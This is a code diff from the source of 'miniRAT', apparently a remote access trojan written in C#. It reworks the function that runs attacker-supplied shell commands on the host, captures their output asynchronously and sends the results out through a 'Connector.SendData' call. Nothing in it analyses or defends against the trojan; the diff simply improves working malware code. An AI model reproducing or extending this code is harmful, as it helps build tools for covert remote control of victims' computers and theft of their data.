@@ -31,8 +31,8 @@ namespace miniRAT
         /// <returns>results of cmd command.</returns>
         static void run(string commnd, string parameters = null)
         {
-            string result = "";
-            string error = "";
+            var result = new StringBuilder();
+            var error = new StringBuilder();
 
             try
             {
@@ -53,9 +53,8 @@ namespace miniRAT
                 Process proc = new Process();
                 proc.StartInfo = procStartInfo;
                 proc.Start();
-                proc.WaitForExit();
-                result = proc.StandardOutput.ReadToEnd();//read output
-                error = proc.StandardError.ReadToEnd();
+                //result = proc.StandardOutput.ReadToEnd();//read output
+                //error = proc.StandardError.ReadToEnd();
 
                 /*if (!proc.WaitForExit(timeout))//TimeOut
                 {
@@ -68,9 +67,23 @@ namespace miniRAT
                     // result = proc.StandardOutput.ReadToEnd();
 
                  }*/
+                proc.ErrorDataReceived += delegate (object sender, DataReceivedEventArgs errorLine)
+                {
+                    if (errorLine.Data != null) result.AppendLine(errorLine.Data);
 
-                if (string.IsNullOrEmpty(result + error))
-                    result = commnd + " done, but NO results or error.";
+                };
+                proc.OutputDataReceived += delegate (object sender, DataReceivedEventArgs outputLine)
+                {
+                    if (outputLine.Data != null) result.AppendLine(outputLine.Data);
+
+                };
+
+                proc.BeginErrorReadLine();
+                proc.BeginOutputReadLine();
+                proc.WaitForExit();
+
+                if (string.IsNullOrEmpty(result.ToString() + error.ToString()))
+                    result.AppendLine(commnd + " done, but NO results or error.");
 
                 Connector.SendData(result + " " + error);
             }
